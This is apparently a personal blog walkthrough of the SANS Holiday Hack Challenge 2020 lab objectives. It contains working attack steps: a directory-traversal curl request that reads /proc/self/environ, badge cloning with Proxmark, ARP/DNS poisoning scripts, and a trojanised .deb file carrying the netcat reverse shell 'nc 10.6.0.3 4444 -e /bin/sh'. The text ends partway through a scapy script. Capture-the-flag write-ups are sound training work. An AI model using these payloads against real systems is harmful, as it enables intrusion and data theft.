5) Unwirl to find the answer</p>
<h3 id="original-billboard-image">Original billboard image :</h3>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/billboard.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/billboard.png?w=1024" /></a></p>
<h2 id="unwirled-image-to-find-the-item">Unwirled Image to find the item :</h2>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/unwirled_image.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/unwirled_image.png?w=764" /></a></p>
<h2 id="objective-2-investigate-the-s3-bucket">Objective 2: Investigate the S3 bucket</h2>
<p>When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.</p>
<h3 id="answer_1">Answer</h3>
<p>North Pole: The Frostiest Place on Earth</p>
<h3 id="process_1">Process</h3>
<p>Using bucket_finder.rb s3 bucket "wrapper3000" was downloaded and extracted.<br />
This folder has a file named 'package' which has base64 encoded string<br />
Below is the process of unwrapping process of ‘package’ file all the way to the text file:<br />
wrapper3000/package &gt; base64 decode &gt; zip file &gt; .bz2 file &gt; .tar file &gt; .xxd file &gt; .xz file &gt; .z file &gt; ASCII text file.  </p>
<pre><code class="language-bash">#!/bin/bash -x
# Author : Ashish Gupta
# Below will download the s3 bucket and will keep unwap till we find a text file 
# The downloaded and extracted folder &quot;wrapper&quot; has this file named 'package' which has base64 encoded string
# Unrapping process :
# wrapper3000/package &gt; base64 decode &gt; zip file &gt; .bz2 file &gt; .tar file &gt; .xxd file &gt; .xz file &gt; .z file &gt; ASCII text file
#
# Assuming we are on home, this will show the items TIPS  bucket\_finder
ls
# Go to bucket\_finder
cd bucket\_finder/
# Check what is currently in the wordlist
cat wordlist
# Append wrapper3000 to the wordlist
echo wrapper3000 &gt;&gt; wordlist
# Check to make sure wrapper3000 is appended to the wordlist
cat wordlist
# Search for s3 buckets with names noted in the 'wordlist' file and if found download them
# Below will download the file named 'package' 
./bucket\_finder.rb wordlist -d
# change to downloaded wrapper3000/ directory
cd wrapper3000
# Check to make sure a file named 'package' exists
ls
# What kind of file is 'package'
# Below will show &quot;package: ASCII text, with very long lines&quot;
file package
# May be a base64 file. decode it to a file named 'myfile'
cat package | base64 -d &gt; myfile
# What kind of file is myfile
# Below will show &quot;myfile: Zip archive data, at least v1.0 to extract&quot;
# So, myfile is a zip. extract using unzip.
# Below will extract to a .bz2 file printing the below
#Archive:  myfile
# extracting: package.txt.Z.xz.xxd.tar.bz2 
unzip myfile
# What kind of file is &quot;package.txt.Z.xz.xxd.tar.bz2&quot; 
# Below will show a bz2 file named &quot;package.txt.Z.xz.xxd.tar.bz2&quot; printing the below :
# package.txt.Z.xz.xxd.tar.bz2: bzip2 compressed data, block size = 900k
file package.txt.Z.xz.xxd.tar.bz2 
# Its bz2 file, extract using bzip2
# Below will extract the bz2 file to another file named &quot;package.txt.Z.xz.xxd.tar&quot;
bzip2 -d package.txt.Z.xz.xxd.tar.bz2
# We have now package.txt.Z.xz.xxd.tar
# What kind of file is &quot;package.txt.Z.xz.xxd.tar&quot;
# below will show .tar printing below :
# package.txt.Z.xz.xxd.tar: POSIX tar archive
file package.txt.Z.xz.xxd.tar 
# Extract the tar file. It will extract to package.txt.Z.xz.xxd
tar -xvf package.txt.Z.xz.xxd.tar
# What kind of file is &quot;package.txt.Z.xz.xxd&quot;
# package.txt.Z.xz.xxd: ASCII text
file package.txt.Z.xz.xxd
# use xxd on this to extract to test2.xz
xxd -r package.txt.Z.xz.xxd test2.xz
# What kind of file is &quot;test2.xz&quot;
# test2.xz: XZ compressed data
file test2.xz
# uncompress test2.xz using xz which will extract the file named &quot;test2&quot;
unxz test2.xz
# rename file test2 to test2.z
mv test2 test2.z
# uncompress test2.z. this will create a file named &quot;test2&quot;
uncompress test2.z
# What kind of file is &quot;test2&quot;
# test2: ASCII text
file test2
# Print the contents of this text file
# Output would show &quot;North Pole: The Frostiest Place on Earth&quot;
cat test2
</code></pre>
<h2 id="objective-3-point-of-sale-password-recovery">Objective 3: Point-of-sale Password Recovery</h2>
<p>Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password?</p>
<h3 id="answer-santapass">Answer : santapass</h3>
<h3 id="process_2">Process :</h3>
<p>Step 1: Extract the santa-shop.exe using 7zip. You see the ASAR file.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-2.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-2.png?w=640" /></a></p>
<p>Step 2: Extract the source code from ASAR application and find the password in main.js</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-3.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-3.png?w=916" /></a></p>
<h2 id="objective-4-operate-the-santavator">Objective 4: Operate the Santavator</h2>
<p>Talk to Pepper Minstix in the entryway to get some hints about the Santavator.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-4.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-4.png?w=619" /></a></p>
<h3 id="process_3">Process</h3>
<p>Use the chrome JS console to rotate the green light and candycane so we can get lights to all the outlets.</p>
<p>a = document.querySelector("body &gt; div.box-parent &gt; div.item.light.greenlight")
a.style.transform = "rotate(-45deg)"
candy = document.querySelector("body &gt; div.box-parent &gt; div.item.item.candycane")
candy.style.transform="rotate(-10deg)"</p>
<h2 id="objective-5-open-hid-block">Objective 5 : Open HID Block</h2>
<p>Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.</p>
<h3 id="copy-the-badge-id-from-elf-bow-ninecandle">Copy the badge id from elf Bow Ninecandle</h3>
<p>Go near Bow Ninecandle in teh "Talks" floor.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-82.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-82.png?w=259" /></a></p>
<p>Open the Proxmark3 CLI from the "Items" menu</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-84.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-84.png?w=835" /></a></p>
<p>Copy the badge value from Bow Ninecandle using the below command :</p>
<p><strong>lf hid read</strong></p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-87.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-87.png?w=1024" /></a></p>
<p>The tag id is <strong>2006e22f0e</strong></p>
<h3 id="use-the-copied-tag-id-to-unlock-the-door-in-workshop-room">Use the copied tag id to unlock the door in workshop room</h3>
<p>Go to the workshop floor and stand in front of the lock.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-88.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-88.png?w=360" /></a></p>
<p>Open Proxmark CLI and simulate the tag id "2006e22f0e" of Bow Ninecandle</p>
<p><strong>lf hid sim -r 2006e22f0e</strong></p>
<p>The door is unlocked!!!</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-89.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-89.png?w=1024" /></a></p>
<p>When you enter the room you just unlocked, Its all dark with light at the end.<br />
You approach it......</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-90.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-90.png?w=380" /></a></p>
<p>and you become Santa!!!<br />
This was a magical moment for me!</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-91.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-91.png?w=468" /></a></p>
<h2 id="objective-6-splunk-challenge">Objective 6: Splunk Challenge</h2>
<p>Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?</p>
<h3 id="splunk-training-question-1">Splunk Training question 1</h3>
<p>How many distinct MITRE ATT&amp;CK techniques did Alice emulate?</p>
<h3 id="answer-13">Answer : 13</h3>
<h3 id="process_4">Process :</h3>
<p>Execute the below Splunk query :</p>
<p>| tstats count where index=t* by index 
| eval results=split(index,"-")<br />
| eval without-dash=mvindex(results,0)
| table without-dash
| rex field=without-dash mode=sed "s/\..*$//" 
| dedup without-dash</p>
<p>OR</p>
<p>| tstats count where index=* by index 
| search index=T*-win OR T*-main
| rex field=index "(?<technique>t\d+)[\.\-].0*" 
| stats dc(technique)</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-5.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-5.png?w=715" /></a></p>
<h3 id="splunk-training-question-2">Splunk Training Question 2 :</h3>
<p>What are the names of the two indexes that contain the results of emulating Enterprise ATT&amp;CK technique 1059.003? (Put them in alphabetical order and separate them with a space)</p>
<h3 id="answer-t1059003-main-t1059003-win">Answer : t1059.003-main t1059.003-win</h3>
<h3 id="process_5">Process :</h3>
<p>Execute the below Splunk query:</p>
<p>index=t1059.003*
| table index
| dedup index
| sort index </p>
<h3 id="output">Output :</h3>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-6.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-6.png?w=461" /></a></p>
<h3 id="splunk-training-question-3">Splunk Training Question 3 :</h3>
<p>One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid?</p>
<h3 id="answer-hkey_local_machinesoftwaremicrosoftcryptography">Answer: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography</h3>
<h3 id="process_6">Process :</h3>
<p>"System Information Discovery" is technique T1082<br />
https://attack.mitre.org/techniques/T1082/</p>
<p>Note per the question, a registry key was queried, so execute the below Splunk query on the all the indexes for the technique t1082 for “reg” to get the registry key which was queried, since the “MachineGuid” needed to be determined, It must have been part of the query, so included that as well in the Splunk query:</p>
<p>index=t1082* reg machineguid  CommandLine!=''
|  table CommandLine</p>
<h2 id="output_1">Output :</h2>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-7.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-7.png?w=878" /></a></p>
<h3 id="splunk-training-question-4">Splunk Training Question 4</h3>
<p>According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)</p>
<h3 id="answer-2020-11-30t174415z">Answer: 2020-11-30T17:44:15Z</h3>
<h3 id="process_7">Process :</h3>
<p>1) Go to the Atomic test GitHub page<br />
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md  </p>
<p>2) Look for "OSTAP".  </p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-8.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-8.png?w=715" /></a></p>
<p>3) Execute the below Splunk query on the “attack” index to get the 1st OSAT related text executed.</p>
<p>index=attack OSTAP 
| table "Execution Time _UTC"
| sort "Execution Time _UTC" asc</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-9.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-9.png?w=545" /></a></p>
<h3 id="splunk-training-question-5">Splunk Training Question 5</h3>
<p>One Atomic Red Team test executed by the Attack Range makes use of an open-source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?</p>
<h3 id="answer-3648">Answer : 3648</h3>
<h3 id="process_8">Process :</h3>
<p>1) First look up what projects were authored by <strong>frgnca</strong><br />
https://github.com/frgnca</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-10.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-10.png?w=892" /></a></p>
<p>2) Search in the attack index with the above projects one by one and you get a hit on "audio"</p>
<p>index=attack audio</p>
<p>We get a hit on this with technique# T1123</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-11.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-11.png?w=921" /></a></p>
<p>3) Confirmed the T1123 does make use of the project "AudioDeviceCmdlets"<br />
<a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md</a></p>
<p>4)  Now pivot to index for the technique T1123 for the "audio" and the Sysmon as source with TimeCreated as time. Note that “tail 1” is used as the ask is to get the process id associated with the “first use”. “tail 1” will provide the 1st record (1st use) as Splunk returns the search results sorted so that the latest result comes first.</p>
<p>index=t1123* EventCode=1 *audio*  source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
| tail 1
| table  TimeCreated, process_id, CommandLine, *</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-12.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-12.png?w=903" /></a></p>
<h3 id="splunk-training-question-6">Splunk Training Question 6</h3>
<p>Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?</p>
<h3 id="answer-quser">Answer : quser</h3>
<h3 id="process_9">Process :</h3>
<p>1) Let’s find which techniques uses the Windows Registry run keys.<br />
Go to <a href="https://mitre-attack.github.io/attack-navigator/v3/enterprise/">https://mitre-attack.github.io/attack-navigator/v3/enterprise/</a><br />
and search for "run" and "view" the 1st result</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-13.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-13.png?w=940" /></a></p>
<p>Its Technique# T1447<br />
Windows registry run keys<br />
https://attack.mitre.org/techniques/T1547/001/</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-14.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-14.png?w=753" /></a></p>
<p>2) Search index t1547 for the sysmon logs for technique with <em>bat</em></p>
<p>index=t1547* "*bat*" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" CommandLine!=''
| table CommandLine</p>
<p>There are two bat files batstartup.bat (stored local) and Discovery.bat (on Github)<br />
Please click on the image to see the larger version.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-15.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-15.png?w=931" /></a></p>
<p>The batch file location appears very small in the above screenshot so listing them out below:<br />
1) $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\<br />
2) https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat</p>
<p>Sysmon logs can’t have the source code of the batstartup.bat.<br />
But look at the second one. It’s on GitHub.<br />
https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat</p>
<p>Just go to that URL and the last line of that batch file is “quser”  </p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-16.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-16.png?w=636" /></a></p>
<h3 id="splunk-training-question-7">Splunk Training Question 7 :</h3>
<p>According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range?</p>
<h3 id="answer-55fceebb21270d9249e86f4b9dc7aa60">Answer : 55FCEEBB21270D9249E86F4B9DC7AA60</h3>
<h3 id="process_10">Process :</h3>
<p>Looking at ALL the technique indices (index=t* ) with source as the zeek x509 logs specifically win-dc:</p>
<p>index=t* *cert* source="/opt/zeek/logs/current/x509.log" certificate.subject=*win-dc*
|  table certificate.serial, certificate.subject
|  dedup certificate.serial, certificate.subject</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-17.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-17.png?w=836" /></a></p>
<h1 id="the-splunk-challenge-question">The Splunk challenge question :</h1>
<p>What is the name of the adversary group that Santa feared would attack KringleCon?</p>
<h2 id="answer-the-lollipop-guild">Answer : The Lollipop Guild</h2>
<h2 id="process_11">Process :</h2>
<h4 id="gather-all-the-hints">Gather all the hints!</h4>
<p>Alice gave a few hints:</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-18.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-18.png?w=600" /></a></p>
<p><strong>Hint 1:</strong><br />
Alice says the "ciphertext is 7FXjP1lyfKbyDK/MChyf36h7"<br />
<strong>Hint 2:<br />
</strong>Alice says "We don't care about RFC 7465"<br />
RFC 7465 requires that the TLC clients and servers never negotiate the user of RC4 ciphers when they establish connections.<br />
https://tools.ietf.org/html/rfc7465<br />
So, if they don’t care about RFC 7465, they ignore that RC4 should not be used and still used RC4 ciphers.<br />
This means the encryption method used was RC4. 
But encryption needs a key. What that key would be?</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-19.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-19.png?w=701" /></a></p>
<p><strong>Hint 3</strong>  </p>
<p>Alice says the last one is encrypted using "your favorite phrase"<br />
Santa asks "my favorite phrase?"<br />
Alice says "I can’t believe the Splunk folks put it in their talk"</p>
<p>now, we go and watch the below talk which is in Kringlecon 2020:<br />
Dave Herrald, Adversary Emulation and Automation | KringleCon 2020<br />
Mr. Dave Herrald has the below in the video:</p>
<p>and he says, this is the most important slide you want to take note of if you are preparing for the Splunk challenge within holiday hack challenge 2020:</p>
<p><strong>Stay Frosty</strong><br />
(That might be our encryption key)</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-20.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-20.png?w=781" /></a></p>
<h2 id="find-answer-using-all-the-hints">Find answer using all the hints:</h2>
<p>So, far we have below hints:<br />
a) We have the base64 text 7FXjP1lyfKbyDK/MChyf36h7<br />
b) We know RC4 could potentially be the encryption method<br />
c) We know “Stay Frosty” could potentially be the encryption keys used in RC4</p>
<p>Now we use all the hints to find out the adversary The Lollipop Guild<br />
Open Cyberchef<br />
https://gchq.github.io/CyberChef/</p>
<p><strong>Build the receipe :</strong><br />
1st item:<br />
"From Base64"<br />
input: 7FXjP1lyfKbyDK/MChyf36h7</p>
<p>2nd Item:<br />
"Encryption /Encoding" &gt; RC4<br />
Passphrase: Stay Frosty</p>
<p><strong>Answer</strong>: The Lollipop Guild</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-21.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-21.png?w=691" /></a></p>
<h1 id="can-bus-problem">CAN Bus Problem</h1>
<h2 id="answer-122520">Answer : 122520</h2>
<h2 id="process_12">Process :</h2>
<p>When you open the UI, you will see many messages.<br />
Filter out the noise with those all 0's in the message in the Sleigh CAN-D bus.<br />
When you click unlock, there is one message which consistently comes up :<br />
<strong>19B#00000F000000</strong></p>
<p>Filter out the other one 19B#0000000F2057. 
Now, we have consistently 19B#00000F000000 when we click unlock.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-22.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-22.png?w=1024" /></a></p>
<p><strong>Criteria added to filter noise and message for unlock found</strong></p>
<p>Now in the CAN-Bus Investigation terminal, grep for “19B#00000F000000" in the canndump.log and you see the entry 1608926671.122520. 
This challenge needed the decimal portion of the timestamp and hence the answer is 122520. 
Please see the below screenshot.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-23.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-23.png?w=1024" /></a></p>
<p><strong>Find the CAN id# in the candump.log</strong>; <strong>Get the decimal portion of the mssage Id</strong> <strong>(the answer)</strong></p>
<h1 id="objective-7-solve-the-sleighs-can-d-bus-problem">Objective 7: Solve the Sleigh's CAN-D-BUS Problem</h1>
<p>Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.</p>
<h2 id="process_13">Process :</h2>
<p>Wunorse Openslae says there is an issue with breaks and doors :</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-24.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-24.png?w=558" /></a></p>
<p>Hints from Wunrose Openslae</p>
<p>CAN ID of doors is 19B<br />
CAN ID of breaks is 080</p>
<p>"Breaks" fix - Exclude all the messages containing FF (larger numbers, greater than decimal 100)<br />
"Doors" fix - Exclude the malicious messages 0F2057</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-25.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-25.png?w=1024" /></a></p>
<h1 id="objective-8-broken-tag-generator">Objective 8: Broken Tag Generator</h1>
<p>Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.</p>
<h2 id="answer-jackfrostwashere">Answer : JackFrostWasHere</h2>
<h2 id="high-level-approach">High level Approach:</h2>
<p>Exploit the directory traversal vulnerability in the tag generator application to use the Local File Inclusion (LFI) on the web server running the application and then access the /proc/self/environ which will contain the all the environment variable used by the web server process including the variable named “GREETZ”</p>
<h2 id="process_14">Process :</h2>
<h3 id="check-if-the-web-app-has-directory-traversal-vulnerability">Check if the web app has directory traversal vulnerability</h3>
<p>The elf Holly Evergreen thinks there may be an issue with the "file upload" feature :</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-26.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-26.png?w=562" /></a></p>
<p>Hints from Holly Evergreen</p>
<p>When you upload an image in the tag generator, the image is stored with below URL.<br />
<a href="https://tag-generator.kringlecastle.com/image?id=.png">https://tag-generator.kringlecastle.com/image?id=<guid>.png</a><br />
[Please click on the image below to see enlarged image]</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-27.png"><img alt="" src="images/image?id=.png" />https://tag-generator.kringlecastle.com/image?id=<guid>.png</a></p>
<p>When you upload a non-image file, it gives a below error.<br />
From the error, we understand the below:</p>
<ol>
<li>It’s a Ruby on Rails app</li>
<li>the app.rb resides in /app/lib</li>
<li>app.rb stores the user uploaded files in /tmp</li>
</ol>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-28.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-28.png?w=624" /></a></p>
<p>Error when you upload an image file</p>
<p>Assuming whatever is being uploaded in /temp is being evaluated without any validation, if we can try directory traversal to get the code of app.rb</p>
<p>curl https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb</p>
<p>../app/lib/app.rb<br />
This means, from the current directory /tmp, go one level up (means root), then app, then lib and then can get app.rb</p>
<p>Now we have the source code of the app.rb :</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-29.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-29.png?w=706" /></a></p>
<h3 id="use-the-local-file-inclusion-lsi-to-access-the-environment-variables-of-the-process">Use the Local File Inclusion (LSI) to access the environment variables of the process</h3>
<p>So, we know this Ruby application has the directory traversal vulnerability<br />
curl https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb</p>
<p>Under Linux, /proc/self is a dynamic symlink that the kernel provides that points to the process opening it.<br />
e.g., if process 1234 tries to follow /proc/self, it will be looking the same content as /proc/1234<br />
and then proc/self/environ will have all the environment variables for the process.</p>
<p>curl https://tag-generator.kringlecastle.com/image?id=../proc/self/environ | tr '\0' '\n'</p>
<p>This will list all the environment variables including “GREETZ” value of which would be “<strong>JackFrostWasHere</strong>”</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-30.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-30.png?w=1024" /></a></p>
<h1 id="objective-9-arp-shenanigans">Objective 9: ARP Shenanigans</h1>
<p>Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?</p>
<h2 id="answer-tanta-kringle">Answer : Tanta Kringle</h2>
<h2 id="high-level-approach_1">High level approach :</h2>
<ol>
<li>Change the ARP cache of target machine (10.6.6.35) so all requests come to our host (ARP Poisoning) and we respond to DNS requests (DNS poisoning).</li>
<li>Build a Linux trojan on a deb file (which 10.6.6.35 is constantly requesting). This Linux trojan when executed on 10.6.6.35 will open a reverse shell of 10.6.6.35 on our host.</li>
<li>With shell access on the 10.6.6.35, we get access to the file /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt which will have the name who recused herself from the vote described on the document.</li>
</ol>
<p>Below screenshot shows how we determined the machines.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-31.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-31.png?w=1024" /></a></p>
<p>Nslookup provides more information on those 3 hosts.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-32.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-32.png?w=1024" /></a></p>
<h2 id="the-process">The Process :</h2>
<h3 id="arp-poisoning">ARP Poisoning:</h3>
<p>Spoof the ARP response going to 10.6.6.35 with our MAC address so all requests (including DNS requests) from 10.6.6.35 come to our host (ARP Poisoning). Change the /script/arp_resp.py accordingly.</p>
<h3 id="dns-poisoning">DNS Poisoning :</h3>
<p>Since we can intercept all the DNS requests coming from 10.6.6.35, we can respond to those DNS responses (DNS poisoning). Change the /script/dns_resp.py accordingly.</p>
<h3 id="create-a-linux-trojan-with-netcat-reverse-shell-payload-for-port-4444-in-it">Create a Linux trojan with netcat reverse shell payload for port 4444 in it</h3>
<p>10.6.6.35 requests for a specific DEB file (pub/jfrost/backdoor/suriv_amd64.deb) over HTTP.<br />
We can create a Linux trojan with any DEB file renamed as above deb file which will include a netcat reverse shell.<br />
The Linux trojan will be placed in the same directory structure as requested by 10.6.6.35 [pub/jfrost/backdoor/suriv_amd64.deb]</p>
<h3 id="run-python-web-server-and-netcat-listening-on-port-4444">Run Python web server and netcat listening on port 4444</h3>
<p>Run the python web server on the root.<br />
Run netcat listening on our host on port 4444.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-34.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-34.png?w=771" /></a></p>
<p>Showing ARP Poisoning</p>
<h3 id="changes-to-the-scriptarp_resppy"><strong>Changes to the script/arp_resp.py</strong> :</h3>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-35.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-35.png?w=836" /></a></p>
<p><strong>Changes to scripts/arp_resp.py</strong></p>
<h3 id="dns-poisoning-diagram">DNS Poisoning diagram :</h3>
<p>Please click on the image to see the enlarged view :</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-36.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-36.png?w=1024" /></a></p>
<p>DNS poisoning</p>
<h3 id="changes-to-scriptsdns_resppy">Changes to scripts/dns_resp.py</h3>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-38.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-38.png?w=672" /></a></p>
<p>Changes to scripts/dns_resp.py</p>
<h3 id="creating-the-linux-trojan">Creating the linux trojan :</h3>
<p>The debs/ folder has a number of deb files. We choose netcat-traditional_1.10-41.1ubuntu1_amd64.deb<br />
Add netcat reverse shell script to this deb file :</p>
<p>nc 10.6.0.3 4444 -e /bin/sh</p>
<p>Above will executed when the deb file is requested and executed on 10.6.6.35. This will give a reverse shell on 10.6.6.35 to out host 10.6.0.3 on 4444. 
Ref : http://www.wannescolman.be/?p=98</p>
<h2 id="putting-it-all-together">Putting it all together :</h2>
<p>See the below screenshot the processes executed in the below order – numbered in the below screenshot.</p>
<h3 id="0-netcat-nlvp-4444">0 : netcat -nlvp 4444</h3>
<p>1 : tcpdump -i eth0 -w dump2.pcap<br />
2 : python3 -m http.server 80<br />
3 : python3 scripts/dns_resp.py<br />
4 : python3 scripts/arp_resp.py<br />
5 : We get reverse shell on 10.6.6.35</p>
<p>Once we get the reverse shell on 10.6.0.3, we can get the file NORTH_POLE_Land_Use_Board_Meeting_Minutes and found who recused hersef from vote.</p>
<p>It was <strong>Tara Kringle</strong>!</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-39.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-39.png?w=864" /></a></p>
<h3 id="all-script-files-in-the-zip-file-please-remove-the-txt-from-files-after-extraction">All Script files in the zip file (please remove the .txt from files after extraction):</h3>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/all_changed_scripts.zip">all_changed_scripts</a><a href="https://ashishrocks.files.wordpress.com/2021/01/all_changed_scripts.zip">Download</a></p>
<h2 id="arp_resppy-with-changes-for-arp-poisoning">arp_resp.py (with changes) for ARP poisoning</h2>
<h1 id="usrbinpython3">!/usr/bin/python3</h1>
<p>from scapy.all import *
import netifaces as ni
import uuid</p>
<h1 id="our-eth0-ip">Our eth0 ip</h1>
<p>ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']</p>
<h1 id="our-eth0-mac-address">Our eth0 mac address</h1>
<p>macaddr = ':'.join(['{:02x}'.format((uuid.getnode() &gt;&gt; i) &amp; 0xff) for i in range(0,8*6,8)][::-1])
def handle_arp_packets(packet):
    # if arp request, then we need to fill this out to send back our mac as the response
    if ARP in packet and packet[ARP].op == 1:
        ether_resp = Ether(dst=packet[ARP].hwsrc, type=0x806, src=macaddr)
        arp_response = ARP(pdst=packet[Ether].psrc)
